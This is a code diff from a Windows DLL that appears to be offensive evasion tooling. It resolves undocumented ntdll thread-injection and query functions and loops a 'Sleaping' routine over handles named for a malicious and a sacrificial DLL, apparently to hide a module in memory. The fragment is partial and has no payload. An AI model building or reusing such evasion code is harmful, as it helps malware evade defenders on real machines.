@@ -584,10 +584,15 @@ bool InitializeNtFunctions(PNT_FUNCTIONS ntFunctions)
     ntFunctions->NtCreateThreadEx = (NtCreateThreadExFunc)GetProcAddress(hNtdll, "NtCreateThreadEx"); // Added
     ntFunctions->NtCreateEvent = (NtCreateEventFunc)GetProcAddress(hNtdll, "NtCreateEvent");
     ntFunctions->NtResumeThread = (NtResumeThreadFunc)GetProcAddress(hNtdll, "NtResumeThread");//
+	ntFunctions->NtQuerySystemInformation = (NtQuerySystemInformationFunc)GetProcAddress(hNtdll, "NtQuerySystemInformation");
+	ntFunctions->NtQueryObject = (NtQueryObjectFunc)GetProcAddress(hNtdll, "NtQueryObject");
+	ntFunctions->NtQueryInformationWorkerFactory = (NtQueryInformationWorkerFactoryFunc)GetProcAddress(hNtdll, "NtQueryInformationWorkerFactory");
+
 
     // Check if all function addresses were retrieved successfully
     if (!ntFunctions->NtResumeThread || !ntFunctions->NtWaitForSingleObject || !ntFunctions->NtQueueApcThread ||
-        !ntFunctions->NtGetContextThread || !ntFunctions->NtSetContextThread || !ntFunctions->NtCreateThreadEx || !ntFunctions->NtCreateEvent) // Modified
+        !ntFunctions->NtGetContextThread || !ntFunctions->NtSetContextThread || !ntFunctions->NtCreateThreadEx || !ntFunctions->NtCreateEvent 
+        || !ntFunctions->NtQueryInformationWorkerFactory || !ntFunctions->NtQueryObject || !ntFunctions->NtQuerySystemInformation ) // Modified
     {
        
         return false;
@@ -663,17 +668,19 @@ BOOL APIENTRY DllMain( HMODULE hModule,
         }
         // function pointers for thread contexts
         PVOID NtTestAlertAddress = GetProcAddress(hNtdll, "NtTestAlert");
-        PVOID NtWaitForSingleObjectAddress = GetProcAddress(hNtdll, "NtWaitForSingleObject");
         PVOID MessageBoxAddress = GetProcAddress(hUser32, "MessageBoxA");
         PVOID ResumeThreadAddress = GetProcAddress(hKernel32, "ResumeThread");
 
-		if (NtTestAlertAddress == NULL || NtWaitForSingleObjectAddress == NULL || MessageBoxAddress == NULL || ResumeThreadAddress == NULL) {
+		if (NtTestAlertAddress == NULL || MessageBoxAddress == NULL || ResumeThreadAddress == NULL) {
 			return FALSE;
 		}
+
+		
+
         //looping and Sleaping <3
         do {
             MessageBoxA(NULL, "Sleaping", "Swappala", MB_OK | MB_ICONINFORMATION);
-            if (Sleaping(myBase, sacDllHandle, malDllHandle, viewSize, &ntFunctions, ResumeThreadAddress, NtTestAlertAddress, MessageBoxAddress, NtWaitForSingleObjectAddress) == -1) {
+            if (Sleaping(myBase, sacDllHandle, malDllHandle, viewSize, &ntFunctions, ResumeThreadAddress, NtTestAlertAddress, MessageBoxAddress) == -1) {
                 //nightmares
                 MessageBoxA(NULL, "Sleaping", "With Nightmares", MB_OK | MB_ICONINFORMATION);
                 return FALSE;
